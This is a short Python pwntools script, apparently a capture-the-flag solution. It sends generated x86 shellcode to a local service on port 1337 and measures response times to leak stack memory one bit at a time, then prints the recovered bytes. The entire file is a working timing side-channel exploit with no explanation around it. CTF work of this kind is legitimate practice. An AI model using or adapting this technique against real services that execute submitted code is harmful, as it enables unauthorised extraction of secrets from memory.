import time
from pwn import *

context(
    arch='x86',
)

def gen(d, n):
    for _ in range(d):
        yield 'pop eax'
    yield '''pop eax
shr eax, %d
and eax, 1
shl eax, 25
top:
cmp eax, 0
je out
dec eax
jmp top
out:
nop
''' % n

def query(d, n):
    start = time.time()
    code  = asm('\n'.join(gen(d, n)))
    conn  = remote('127.0.0.1', 1337)
    conn.sendline(code.encode('hex'))
    try:
        conn.read()
    except EOFError:
        pass
    conn.close()
    return time.time() - start

def time_to_bit(t):
    if t < 0.1:
        return 0
    return 1

words = []

for d in range(10000):
    word = 0
    for n in range(32):
        bit = time_to_bit(query(d, n))
        word |= (bit << n)
    if word == 0:
        break
    words.append(word)

words = [('%08x' % x).decode('hex')[::-1] for x in words]
words = ''.join(words)
print words
